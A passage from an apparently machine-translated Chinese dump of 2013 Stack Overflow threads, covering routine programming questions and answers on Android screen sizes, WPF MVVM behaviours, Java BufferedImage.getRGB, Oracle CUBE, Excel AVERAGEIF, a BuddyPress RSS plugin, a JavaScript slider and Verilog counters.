因此，当您为 mdpi、hdpi、xhdpi 提供图形时，它将完美地工作。

因此，让您在模拟器 1280x800 中使用您的正常分辨率进行设计

2 如何告诉平板电脑本身以 1900x1200 分辨率工作？

Google 最近在开发者控制台中发布了一个设备可用性对话框，允许您选择要安装的特定设备。[链接在这里](https://support.google.com/googleplay/android-developer/answer/1286017?hl=en&ref_topic=2897459)

[如何将 android 应用程序限制为特定设备品牌？](https://stackoverflow.com/a/9510829/1012284)

如果你只想支持平板电脑，你可以这样做

```
<supports-screens
        android:smallScreens="false"
        android:normalScreens="false"
        android:largeScreens="false"
        android:xlargeScreens="true"
        android:anyDensity="false" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:23:36.670

简短的回答：一切都很好，不用担心。

平板电脑几乎总是使用默认/原生/最大分辨率。如果一切看起来都不错，那就不要担心。无论如何，它*正在*使用完整的分辨率。据我所知，您无法更改图形布局编辑器以使用自定义分辨率，因此您在那里没有太多选择（至少目前如此）。听起来使用 1280x800 配置可以让您足够接近，以至于它在编辑器和设备上看起来都不错，所以实际上您不需要更改任何内容，除非您有一些非常复杂的东西，否则几乎没有什么好处根本不适合较小分辨率屏幕的布局（同样，仅在编辑器中，设备将使用全分辨率）。

# c# - 如何将附加行为右键单击文本块？

> ID：15772069
> 
> 赞同：2
> 
> 时间：2013-04-02T18:53:03.397
> 
> 标签：c#, wpf, .net-4.0, mvvm-light, attachedbehaviors

我正在开发 WPF 应用程序并尽我所能遵循 MVVM 架构。我正在为我的所有命令和行为使用 GalaSoft MVVM 光继电器命令实现。

目前，我正在尝试学习和理解附加行为，特别是如何为我的应用程序中的文本块实现附加行为。

我想做的是有一种风格，我可以应用它来选择将执行一些通用命令的文本块（稍后将详细介绍我所说的“通用”）

这是我想做的一个例子。

例如，我有两个窗口。显然在实际应用中我会有更多，但这应该适合我的指导需求。

我想将附加行为应用于这些窗口中的文本块，以实现定义的行为......代码......

**主窗口**

```
<Window x:Class="AttachedExample.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow"
        Height="350"
        Width="525"
        DataContext="{Binding Source={StaticResource Locator}, Path=Main}">
    <StackPanel>
        <TextBlock  Text="{Binding Path=SomeMainWindowModel.SomeText}" />
    </StackPanel>
</Window> 
```

**主窗口视图模型**

```
public class MainWindowViewModel : BaseViewModel
{
    private MainWindowModel _someMainWindowModel = new MainWindowModel();

    public MainWindowModel SomeMainWindowModel
    {
        get
        {
            return this._someMainWindowModel;
        }
        set
        {
            this._someMainWindowModel = value;
            this.NotifyPropertyChange("SomeMainWindowModel");
        }
    }
} 
```

**主窗口模型**

```
public class MainWindowModel : BaseModel
{
    private string _someText = "Some main text for Stack Overflow!";

    public string SomeText
    {
        get
        {
            return this._someText;
        }
        set
        {
            this._someText = value;
            this.NotifyPropertyChange("SomeText");
        }
    }
} 
```

现在是辅助窗口....

**辅助窗口**

```
<Window x:Class="AttachedExample.SecondaryWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="SecondaryWindow"
        Height="300"
        Width="300"
        DataContext="{Binding Source={StaticResource Locator}, Path=Secondary}">
    <StackPanel>
        <TextBlock  Text="{Binding Path=SomeSecondaryWindowModel.SomeSecondaryText}" />
    </StackPanel>
</Window> 
```

**辅助窗口视图模型**

```
public class SecondaryWindowViewModel : BaseViewModel
{
    private SecondaryWindowModel _someSecondaryWindowModel = new SecondaryWindowModel();

    public SecondaryWindowModel SomeSecondaryWindowModel
    {
        get
        {
            return this._someSecondaryWindowModel;
        }
        set
        {
            this._someSecondaryWindowModel = value;
            this.NotifyPropertyChange("SomeSecondaryWindowModel");
        }
    }
} 
```

**辅助窗口模型**

```
public class SecondaryWindowModel : BaseModel
{
    private string _someSecondaryText = "Some secondary text for Stack Overflow!";

    public string SomeSecondaryText
    {
        get
        {
            return this._someSecondaryText;
        }
        set
        {
            this._someSecondaryText = value;
            this.NotifyPropertyChange("SomeSecondaryText");
        }
    }
} 
```

我想要做的是能够在资源字典或 App.xaml 中拥有一种样式，我可以将其应用于这些文本块中的每一个。该样式将指定一个附加行为，该行为将使用文本块内容的参数执行一个方法，右键单击。

**伪代码**

```
*Right Click text block on MainWindow;*

SomeStaticClass.ExecuteSomeStaticCustomMethod(mainWindowTextBlock.Content.ToString());

*Right Click text block on SecondaryWindow;*

SomeStaticClass.ExecuteSomeStaticCustomMethod(secondaryWindowTextBlock.Content.ToString()); 
```

这是一大堆示例代码和解释，用于描述可以通过背后代码中的事件处理程序完成的事情......但这不会遵循 MVVM 模式。

请记住我在您的回复中使用了 MVVM 灯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T06:11:36.423

这可能是您正在寻找的并且符合 MVVM 标准。我使用一种样式将中继命令附加到用户控件内的文本块事件，此用户控件绑定到 MVVM_Light Viewmodel 并具有数据上下文。

```
<Style x:Key="StyleName" TargetType="{x:Type TextBlock}">
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type TextBlock}">
                <Border x:Name="Bd" SnapsToDevicePixels="true" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}">
                    <ScrollViewer x:Name="PART_ContentHost" SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}">
                        <i:Interaction.Triggers>
                            <i:EventTrigger EventName="PreviewMouseRightButtonDown">
                                <cmd:EventToCommand Command="{Binding DataContext.PreviewMouseRightButtonDownCommand, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type UserControl}}}"
                                    CommandParameter="{Binding Name, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type TextBox}}}"/>
                            </i:EventTrigger>
                        </i:Interaction.Triggers>
                    </ScrollViewer>
                </Border>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

我删除了额外的样式属性以使其更易于阅读。您需要在视图模型中创建一个名为 PreviewMouseRightButtonDownCommand 的字符串类型的命令。然后它将获取文本块名称作为参数。您可以将参数更改为您想要的任何绑定。这样，我想触发此事件命令的任何文本块只需将其样式设置为此 StyleName。

希望这可以帮助

# java - Java 图像错误

> ID：15772073
> 
> 赞同：-2
> 
> 时间：2013-04-02T18:53:10.960
> 
> 标签：java, image, int, rgb

今天我遇到了一个我无法解释的错误，我正在观看 notch 的视频，他正在创建那个 2d 游戏 HerpFortress ( [http://pt.twitch.tv/notch/b/309642636](http://pt.twitch.tv/notch/b/309642636) (0:42:44))，我正在关注他的代码，但在这一行我得到了一个错误，我通过了......

```
img.getRGB(x * sw, y * sh, sw, sh, result [x][y].pixels, 0, sw); 
```

错误是，

```
The method getRGB(int, int, int, int, int[], int, int) in the type BufferedImage is not applicable for the arguments (int, int, int, int, int, int, int) 
```

帮助 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:00:35.183

错误消息本身会告诉您出了什么问题。该[`getRGB`](http://docs.oracle.com/javase/7/docs/api/java/awt/image/BufferedImage.html#getRGB%28int,%20int,%20int,%20int,%20int%5b%5d,%20int,%20int%29)方法在第 5 个参数中需要一个整数数组 ( `int[]`)，并且您必须提供一个 plain `int`，尽管从您的代码中并不清楚这一点`result [x][y].pixels`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:01:46.420

```
img.getRGB(x * sw, y * sh, sw, sh, result [x][y].pixels, 0, sh); 
```

**结果 [x][y].pixels**中的错误：---> 这是一个值而不是数组，这个方法在这个地方取数据将被写入的数组就像这个例子：

```
int[] outPixels = new int[width*height];
img.getRGB( 0, 0, width, height, outPixels, 0, width ); 
```

**方法 ：**

```
getRGB(startX, startY, w, h, rgbArray, offset, scansize) 
```

**参数：**

```
startX - the starting X coordinate
startY - the starting Y coordinate 
w - width of region h - height of region 
rgbArray - if not null, the rgb pixels are written here 
offset - offset into the rgbArray scansize - scanline stride for the rgbArray 
```

# sql - SQL：多维数据集函数错误终止

> ID：15772077
> 
> 赞同：1
> 
> 时间：2013-04-02T18:53:22.913
> 
> 标签：sql, oracle, oracle11g, sum, cube

使用 Oracle 11g 的简单语法错误。使用以下 SQL 语句：

```
SELECT employee, CUST_NBR,
SUM (SALE_PRICE)
FROM CUST_ORDER
GROUP BY employee, CUST_NBR WITH CUBE 
```

对于表 CUST_ORDER (*ORDER_ID, employee, SALE_PRICE, CUST_NBR)

甲骨文抱怨说

> 第 4 行出现错误：ORA-00933：SQL 命令未正确结束

我可能是盲人，但我看不到问题

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T18:59:24.067

你应该使用

```
GROUP BY CUBE(employee, CUST_NBR) 
```

更多关于`CUBE` [这里](http://www.oracle-base.com/articles/misc/rollup-cube-grouping-functions-and-grouping-sets.php)。

# excel - 如何使平均公式只计算大于零的数字？

> ID：15772078
> 
> 赞同：5
> 
> 时间：2013-04-02T18:53:25.623
> 
> 标签：excel, if-statement, count, sum, average

`=AVERAGE(K2:K32)`

如您所见，我有这个公式吐出库伦 K 的平均值。我遇到的问题是 K 列中的数字由一个公式填充，基本上将另外两列加在一起，所以如果没有输入数据，则返回的数字为 0。这显然会抛出一个月的平均计算不完整，我怎样才能让这个公式只计算大于零的数字？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-02T19:00:50.787

```
=AVERAGEIF(K2:K32, ">0") 
```

这是示例公式，其中包括值 > 0 的单元格。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-15T06:24:44.367

由于您提到*一个月的平均计算不完整*，并且*K 列中的数字由一个公式填充，如果添加的任何一个数字可能是负数，则基本上将另外两列加在一起*`0`，因此该公式似乎甚至可能返回对于该月的完整部分，因此严格来说，`0`在这种情况下应将 a 考虑为真实平均值。因此，假设要添加的数字之一在 ColumnE 中（这将是空白或`0`对于该月的不完整部分），我建议使用数组公式，例如：

```
 =AVERAGE(IF(E2:E32<>0,K2:K32)) 
```

使用 Ctrl+Shift+Enter 输入。对于少于 31 天的`0`月份，为不存在的天数在 ColumnE 中输入一个值。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-08-27T15:48:54.803

您必须使用：

```
=AVERAGEIF(K2:K32,">0") 
```

确保公式中没有空格。

# php - Buddypress 插件错误 - XML 到 PHP

> ID：15772079
> 
> 赞同：1
> 
> 时间：2013-04-02T18:53:25.953
> 
> 标签：php, mysql, xml-parsing, wordpress, buddypress

它是一个外部群组博客插件

它使您的 BuddyPress 安装上的群组创建者和管理员能够将外部博客 RSS 提要附加到群组。
博客文章将出现在该组的活动流中。
如果有人专门访问小组页面，则每小时或每 30 分钟会自动拉出新帖子。

我发现了很多错误。
1）它不会自动获取提要 2）如果我尝试手动更新提要，它会重新发布相同的条目，我的意思是它没有获取新提要。3) WordPress 管理栏也不能与这个插件一起正常工作。

该插件包含 2 个网页。

首先和主页是loader.php

```
<?php

/*
Plugin Name: External Group Blogs
Plugin URI: http://wordpress.org/extend/plugins/external-group-blogs/
Description: Allow group creators to supply external blog RSS feeds that will attach        future posts on blogs to a group.
*/

 /* Only load the plugin functions if BuddyPress is loaded and initialized. */
function bp_groupblogs_init() {
require( dirname( __FILE__ ) . '/bp-groups-externalblogs.php' );
}
add_action( 'bp_init', 'bp_groupblogs_init' );

/* On activation register the cron to refresh external blog posts. */
function bp_groupblogs_activate() {
wp_schedule_event( time(), 'hourly', 'bp_groupblogs_cron' );
}
register_activation_hook( __FILE__, 'bp_groupblogs_activate' );

/* On deacativation, clear the cron. */
function bp_groupblogs_deactivate() {
wp_clear_scheduled_hook( 'bp_groupblogs_cron' );

/* Remove all external blog activity */
if ( function_exists( 'bp_activity_delete' ) )
    bp_activity_delete( array( 'type' => 'exb' ) );
}
register_deactivation_hook( __FILE__, 'bp_groupblogs_deactivate' );

?> 
```

第二个文件是 bp-groups-externalblogs.php

```
<?php
/* Group blog extension using the BuddyPress group extension API */
if ( class_exists('BP_Group_Extension' ) ) {

class Group_External_Blogs extends BP_Group_Extension {
    function __construct() {
        global $bp;
        $this->name = __( 'External Blogs', 'bp-groups-externalblogs' );
        $this->slug = 'external-blog-feeds';
        $this->create_step_position = 21;
        $this->enable_nav_item = false;
    }
    function create_screen() {
        global $bp;
        if ( !bp_is_group_creation_step( $this->slug ) )
            return false;
        ?>
        <p><?php _e(
            "Add RSS feeds of blogs you'd like to attach to this group in the box below.
             Any future posts on these blogs will show up on the group page and be recorded
             in activity streams.", 'bp-groups-externalblogs' ) ?>
        </p>
        <p class="desc"><?php _e( "Seperate URL's with commas.", 'bp-groups-externalblogs' ) ?></span>
        <p>
            <label for="blogfeeds"><?php _e( "Feed URL's:", 'bp-groups-externalblogs' ) ?></label>
            <textarea name="blogfeeds" id="blogfeeds"><?php echo attribute_escape( implode( ', ', (array)groups_get_groupmeta( $bp->groups->current_group->id, 'blogfeeds' ) ) ) ?></textarea>
        </p>
        <?php
        wp_nonce_field( 'groups_create_save_' . $this->slug );
    }
    function create_screen_save() {
        global $bp;
        check_admin_referer( 'groups_create_save_' . $this->slug );
        $unfiltered_feeds = explode( ',', $_POST['blogfeeds'] );
        foreach( (array) $unfiltered_feeds as $blog_feed ) {
            if ( !empty( $blog_feed ) )
                $blog_feeds[] = trim( $blog_feed );
        }
        groups_update_groupmeta( $bp->groups->current_group->id, 'blogfeeds', $blog_feeds );
        groups_update_groupmeta( $bp->groups->current_group->id, 'bp_groupblogs_lastupdate', gmdate( "Y-m-d H:i:s" ) );
        /* Fetch */
        bp_groupblogs_fetch_group_feeds( $bp->groups->current_group->id );
    }
    function edit_screen() {
        global $bp;
        if ( !bp_is_group_admin_screen( $this->slug ) )
            return false; ?>
        <p class="desc"><?php _e( "Enter RSS feed URL's for blogs you would like to attach to this group. Any future posts on these blogs will show on the group activity stream. Seperate URL's with commas.", 'bp-groups-externalblogs' ) ?></span>
        <p>
            <label for="blogfeeds"><?php _e( "Feed URL's:", 'bp-groups-externalblogs' ) ?></label>
            <textarea name="blogfeeds" id="blogfeeds"><?php echo attribute_escape( implode( ', ', (array)groups_get_groupmeta( $bp->groups->current_group->id, 'blogfeeds' ) ) ) ?></textarea>
        </p>
        <input type="submit" name="save" value="<?php _e( "Update Feed URL's", 'bp-groups-externalblogs' ) ?>" />
        <?php
        wp_nonce_field( 'groups_edit_save_' . $this->slug );
    }
    function edit_screen_save() {
        global $bp;
        if ( !isset( $_POST['save'] ) )
            return false;
        check_admin_referer( 'groups_edit_save_' . $this->slug );
        $existing_feeds = (array)groups_get_groupmeta( $bp->groups->current_group->id, 'blogfeeds' );
        $unfiltered_feeds = explode( ',', $_POST['blogfeeds'] );
        foreach( (array) $unfiltered_feeds as $blog_feed ) {
            if ( !empty( $blog_feed ) )
                $blog_feeds[] = trim( $blog_feed );
        }
        /* Loop and find any feeds that have been removed, so we can delete activity stream items */
        if ( !empty( $existing_feeds ) ) {
            foreach( (array) $existing_feeds as $feed ) {
                if ( !in_array( $feed, (array) $blog_feeds ) )
                    $removed[] = $feed;
            }
        }
        if ( $removed  ) {
            /* Remove activity stream items for this feed */
            include_once( ABSPATH . WPINC . '/rss.php' );
            foreach( (array) $removed as $feed ) {
                $rss = fetch_rss( trim( $feed ) );
                if ( function_exists( 'bp_activity_delete' ) ) {
                    bp_activity_delete( array(
                        'item_id' => $bp->groups->current_group->id,
                        'secondary_item_id' => wp_hash( $rss->channel['link'] ),
                        'component' => $bp->groups->id,
                        'type' => 'exb'
                    ) );
                }
            }
        }
        groups_update_groupmeta( $bp->groups->current_group->id, 'blogfeeds', $blog_feeds );
        groups_update_groupmeta( $bp->groups->current_group->id, 'bp_groupblogs_lastupdate', gmdate( "Y-m-d H:i:s" ) );
        /* Re-fetch */
        bp_groupblogs_fetch_group_feeds( $bp->groups->current_group->id );
        bp_core_add_message( __( 'External blog feeds updated successfully!', 'bp-groups-externalblogs' ) );
        bp_core_redirect( bp_get_group_permalink( $bp->groups->current_group ) . '/admin/' . $this->slug );
    }
    /* We don't need display functions since the group activity stream handles it all. */
    function display() {}
    function widget_display() {}
}

bp_register_group_extension( 'Group_External_Blogs' );

function bp_groupblogs_fetch_group_feeds( $group_id = false ) {
    global $bp;
    include_once( ABSPATH . 'wp-includes/rss.php' );
    if ( empty( $group_id ) )
        $group_id = $bp->groups->current_group->id;
    if ( $group_id == $bp->groups->current_group->id )
        $group = $bp->groups->current_group;
    else
        $group = new BP_Groups_Group( $group_id );
    if ( !$group )
        return false;
    $group_blogs = groups_get_groupmeta( $group_id, 'blogfeeds' );
    $group_blogs = explode(";",$group_blogs[0]);

    /* Set the visibility */
    $hide_sitewide = ( 'public' != $group->status ) ? true : false;
    foreach ( (array) $group_blogs as $feed_url ) {
        $rss = fetch_feed( trim( $feed_url ) );
        if (!is_wp_error($rss) ) {
            foreach ( $rss->get_items(0,10) as $item ) {;
                $key = $item->get_date( 'U' );
                $items[$key]['title'] = $item->get_title();
                $items[$key]['subtitle'] = $item->get_title();
                //$items[$key]['author'] = $item->get_author()->get_name();
                $items[$key]['blogname'] = $item->get_feed()->get_title();
                $items[$key]['link'] = $item->get_permalink();
                $items[$key]['blogurl'] = $item->get_feed()->get_link();
                $items[$key]['description'] = $item->get_description();
                $items[$key]['source'] = $item->get_source();
                $items[$key]['copyright'] = $item->get_copyright();
            }
        }
    }
    if ( $items ) {
        ksort($items);
        $items = array_reverse($items, true);
    } else {
        return false;
    }
    /* Record found blog posts in activity streams */
    foreach ( (array) $items as $post_date => $post ) {
        //var_dump($post);
        if (substr($post['blogname'],0,7) == "Twitter") {
            $activity_action = sprintf( __( '%s from %s in the group %s', 'bp-groups-externalblogs' ), '<a class="feed-link" href="' . esc_attr( $post['link'] ) . '">Tweet</a>', '<a class="feed-author" href="' . esc_attr( $post['blogurl'] ) . '">' . attribute_escape( $post['blogname'] ) . '</a>', '<a href="' . bp_get_group_permalink( $group ) . '">' . attribute_escape( $group->name ) . '</a>' );
        } else {
            $activity_action = sprintf( __( 'Blog: %s from %s in the group %s', 'bp-groups-externalblogs' ), '<a class="feed-link" href="' . esc_attr( $post['link'] ) . '">' . esc_attr( $post['title'] ) . '</a>', '<a class="feed-author" href="' . esc_attr( $post['blogurl'] ) . '">' . attribute_escape( $post['blogname'] ) . '</a>', '<a href="' . bp_get_group_permalink( $group ) . '">' . attribute_escape( $group->name ) . '</a>' );
        }

        $activity_content = '<div>' . strip_tags( bp_create_excerpt( $post['description'], 175 ) ) . '</div>';
        $activity_content = apply_filters( 'bp_groupblogs_activity_content', $activity_content, $post, $group );
        /* Fetch an existing activity_id if one exists. */
        if ( function_exists( 'bp_activity_get_activity_id' ) )
            $id = bp_activity_get_activity_id( array( 'user_id' => false, 'action' => $activity_action, 'component' => $bp->groups->id, 'type' => 'exb', 'item_id' => $group_id, 'secondary_item_id' => wp_hash( $post['blogurl'] ) ) );
        /* Record or update in activity streams. */
        groups_record_activity( array(
            'id' => $id,
            'user_id' => false,
            'action' => $activity_action,
            'content' => $activity_content,
            'primary_link' => $item->get_link(),
            'type' => 'exb',
            'item_id' => $group_id,
            'secondary_item_id' => wp_hash( $post['blogurl'] ),
            'recorded_time' => gmdate( "Y-m-d H:i:s", $post_date ),
            'hide_sitewide' => $hide_sitewide
        ) );
    }
    return $items;
}

/* Add a filter option to the filter select box on group activity pages */
function bp_groupblogs_add_filter() { ?>
    <option value="exb"><?php _e( 'External Blogs', 'bp-groups-externalblogs' ) ?></option><?php
}
add_action( 'bp_group_activity_filter_options', 'bp_groupblogs_add_filter' );
add_action( 'bp_activity_filter_options', 'bp_groupblogs_add_filter' );

/* Add a filter option groups avatar */
/* Fetch group twitter posts after 30 mins expires and someone hits the group page */
function bp_groupblogs_refetch() {
    global $bp;
    $last_refetch = groups_get_groupmeta( $bp->groups->current_group->id, 'bp_groupblogs_lastupdate' );
    if ( strtotime( gmdate( "Y-m-d H:i:s" ) ) >= strtotime( '+30 minutes', strtotime( $last_refetch ) ) )
        add_action( 'wp_footer', 'bp_groupblogs_refetch' );
    /* Refetch the latest group twitter posts via AJAX so we don't stall a page load. */
    function _bp_groupblogs_refetch() {
        global $bp; ?>
        <script type="text/javascript">
            jQuery(document).ready( function() {
                jQuery.post( ajaxurl, {
                    action: 'refetch_groupblogs',
                    'cookie': encodeURIComponent(document.cookie),
                    'group_id': <?php echo $bp->groups->current_group->id ?>
                });
            });
        </script><?php
        groups_update_groupmeta( $bp->groups->current_group->id, 'bp_groupblogs_lastupdate', gmdate( "Y-m-d H:i:s" ) );
    }
}
add_action( 'groups_screen_group_home', 'bp_groupblogs_refetch' );

/* Refresh via an AJAX post for the group */
function bp_groupblogs_ajax_refresh() {
    bp_groupblogs_fetch_group_feeds( $_POST['group_id'] );
}
add_action( 'wp_ajax_refetch_groupblogs', 'bp_groupblogs_ajax_refresh' );

function bp_groupblogs_cron_refresh() {
    global $bp, $wpdb;
    $group_ids = $wpdb->get_col( $wpdb->prepare( "SELECT group_id FROM " . $bp->groups->table_name_groupmeta . " WHERE meta_key = 'blogfeeds'" ) );
    foreach( $group_ids as $group_id )
        bp_groupblogs_fetch_group_feeds( $group_id );
}
add_action( 'bp_groupblogs_cron', 'bp_groupblogs_cron_refresh' );
}

// Add a filter option groups avatar
function bp_groupblogs_avatar_type($var) {
global $activities_template, $bp;

if ( $activities_template->activity->type == "exb" ) {
    return 'group';
} else {
    return $var;
}
}
add_action( 'bp_get_activity_avatar_object_groups', 'bp_groupblogs_avatar_type');
add_action( 'bp_get_activity_avatar_object_activity', 'bp_groupblogs_avatar_type');

function bp_groupblogs_avatar_id($var) {
global $activities_template, $bp;

if ( $activities_template->activity->type == "exb" ) {
    return $activities_template->activity->item_id;
}

return $var;

}
add_action( 'bp_get_activity_avatar_item_id', 'bp_groupblogs_avatar_id');

?> 
```

我建议停止活动流中的数据重复。也许每天使用一次 wp-cron api 和当前日期 xml 提要获取系统。因此，它不会在组活动流中重复相同的提要。我们需要一个标准来阻止 bp 组活动流中的数据重复。这是我项目的一部分。是否有另一种获取提要并将其保存到 mysql 表（在组活动流中）然后将其显示为最新组更新的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:33:38.657

实际上它是自动获取的。我在插件中看到了 cron 用法。WordPress Cron 仅在任何用户打开您的网站时触发。所以没有用户（没有页面浏览量） - 没有 cron 活动。在每次浏览 WP-Cron 时，检查是否到了触发任何功能的时间。

也许[这个插件](https://github.com/slaFFik/bp-groups-rss-feed-tab)会对您有所帮助 - 在单独的组选项卡中显示 RSS 提要。

# android - 在 Facebook 的 Action Bar Sherlock 中传递结果 ResultInfo 失败

> ID：15772082
> 
> 赞同：0
> 
> 时间：2013-04-02T18:53:32.723
> 
> 标签：android, android-activity, android-fragments, facebook-android-sdk

我在我的应用程序中使用 Action bar sherlock 库，我目前有一个两个选项卡作为片段：

选项卡 A：用户查看列表中的信息选项卡 B：用户可以登录 facebook

我需要 onActivityResult() 来处理选项卡 B 中的 Facebook 会话，因此我的 Main Activity 中有以下代码：

```
 public void onActivityResult(int requestCode, int resultCode, Intent data) {
      super.onActivityResult(requestCode, resultCode, data);
      Session.getActiveSession().onActivityResult(this, requestCode, resultCode, data);
  } 
```

但是，当我按下选项卡 A 中的后退按钮时，这会创建此错误日志：

```
04-02 19:46:07.488: E/AndroidRuntime(1380): FATAL EXCEPTION: main
04-02 19:46:07.488: E/AndroidRuntime(1380): java.lang.RuntimeException: Failure delivering result ResultInfo{who=null, request=65537, result=0, data=null} to activity {com.example.chartviewer/com.example.chartviewer.MainActivity}: java.lang.NullPointerException
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.app.ActivityThread.deliverResults(ActivityThread.java:3141)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.app.ActivityThread.handleSendResult(ActivityThread.java:3184)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.app.ActivityThread.access$1100(ActivityThread.java:130)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1243)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.os.Looper.loop(Looper.java:137)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.app.ActivityThread.main(ActivityThread.java:4745)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at java.lang.reflect.Method.invokeNative(Native Method)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at java.lang.reflect.Method.invoke(Method.java:511)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at dalvik.system.NativeStart.main(Native Method)
04-02 19:46:07.488: E/AndroidRuntime(1380): Caused by: java.lang.NullPointerException
04-02 19:46:07.488: E/AndroidRuntime(1380):     at com.example.chartviewer.MainActivity.onActivityResult(MainActivity.java:91)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.app.Activity.dispatchActivityResult(Activity.java:5192)
04-02 19:46:07.488: E/AndroidRuntime(1380):     at android.app.ActivityThread.deliverResults(ActivityThread.java:3137)
04-02 19:46:07.488: E/AndroidRuntime(1380):     ... 11 more 
```

知道如何处理吗？

# javascript - 鼠标悬停在更改图像上

> ID：15772084
> 
> 赞同：0
> 
> 时间：2013-04-02T18:53:37.167
> 
> 标签：javascript

我想用 javascript 制作小滑块，这是我的代码。HTML：

```
<div id="slider">
    <div id="thumbs">
        <span id="img1"><img src="Anim/01.png" onmouseover="tofull(1)"></span><br>
        <span id="img2"><img src="Anim/02.png" onmouseover="tofull(2)"></span><br>
        <span id="img3"><img src="Anim/03.png" onmouseover="tofull(3)"></span><br>
        <span id="img4"><img src="Anim/04.png" onmouseover="tofull(4)"></span><br>
        <span id="img5"><img src="Anim/05.png" onmouseover="tofull(5)"></span><br>
        <span id="img6"><img src="Anim/06.png" onmouseover="tofull(6)"></span>
    </div>
    <div id="full">
        <img src="Anim/01.png">
    </div>
</div> 
```

这是我的 javascript

```
function tofull(n){
    switch (tofull){
        case 1:
            document.getElementById("full").innerHTML = "<img src='Anim/01.png'>";
            break;
        case 2:
            document.getElementById("full").innerHTML = "<img src='Anim/02.png'>";
            break;
        case 3:
            document.getElementById("full").innerHTML = "<img src='Anim/03.png'>";
            break;
        case 4:
            document.getElementById("full").innerHTML = "<img src='Anim/04.png'>";
            break;
        case 5:
            document.getElementById("full").innerHTML = "<img src='Anim/05.png'>";
            break;
        case 6:
            document.getElementById("full").innerHTML = "<img src='Anim/06.png'>";
            break;
    }
} 
```

每次我将鼠标悬停在 中的图像上`#thumbs`，什么都没有发生。你能告诉我为什么吗？想法是，如果我将鼠标悬停在 img1 上，我想将他打印在`#full`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T18:55:57.050

你需要`switch`打开`n`. 你在`switch`继续`toFull`

`switch (n)`改为使用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:07:37.753

您的开关使用的东西与您传入的不同。您还可以通过更新图像标签的节点“src”属性来减少一些代码。

```
function tofull(n){
    //Select 'full' and get the image tag inside
    var imgEl = document.getElementById("full").childNodes[0];
    switch (n){
        case 1:
            imgEl.src = 'Anim/01.png';
            break;
        case 2:
            imgEl.src = 'Anim/02.png';
            break;
        //Continue the pattern
    }
} 
```

如果您必须更改“完整”的名称，您只需在代码中的一处更新它

# verilog - Verilog 更改变量的值

> ID：15772088
> 
> 赞同：1
> 
> 时间：2013-04-02T18:53:52.113
> 
> 标签：verilog, fpga

我正在实现一个简单的计数器，它计算按下按钮的次数。我写了以下代码：

```
module lock(
anodes,cathodes,leds,
sw,btns,clk );

//input declarations
input[7:0] sw;
input[3:0]btns;
input clk;

always @(curbtns)
begin
if( prevbtns!=0 && curbtns==0)
begin
    counter_next = counter + 5'b00001;
end
else
    counter_next = counter;
prevbtns = curbtns;
end

always @(btns or sw)
begin
case(btns)
4'b0001:curbtns=4'b0001;
4'b0010:curbtns=4'b0010;
4'b0100:curbtns=4'b0100;
4'b1000:curbtns=4'b1000;
4'b0000:curbtns=4'b0000;
default:curbtns = prevbtns; 
endcase
end

always @(posedge clk)
begin
counter <=counter_next;
create_slow_clock(clk,slow_clock);
end
endmodule 
```

当我在 icraus verilog 中模拟上面的代码时，它似乎在工作，但在实际的 FPGA 上，我的计数器没有改变。增加变量的逻辑是否有任何问题。

更新的代码（工作）

```
always @(curbtns or prevbtns or counter)
begin
 if( prevbtns!=0 && curbtns==0)
 begin
 counter_next = counter + 5'b00001;
 end
 else
 counter_next = counter;
end

always @(posedge clk)
begin
counter <=counter_next;
prevbtns <=curbtns;
create_slow_clock(clk,slow_clock);
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:00:23.430

您看起来在组合 always 块的敏感度列表中缺少一些信号。

为了使您的代码能够正确合成，组合块必须对**每个**输入信号都敏感。

第一个 always 块`always @(curbtns)`需要对`prevbtns`、`curbtns`和敏感`counter`。

第二块`always @(btns or sw)`也需要敏感`prevbtns`（反正我没看到`sw`用在这个块中，应该去掉它）。

我建议将两个块都更改为`always @*`，以便可以自动推断列表，并且如果您更改逻辑并忘记更改列表，这不是一个脆弱的破坏点。

# java - 利用 java servlet 中的 matplotlib 调用 python 脚本

> ID：15772089
> 
> 赞同：0
> 
> 时间：2013-04-02T18:53:55.057
> 
> 标签：java, python, bash, servlets, matplotlib

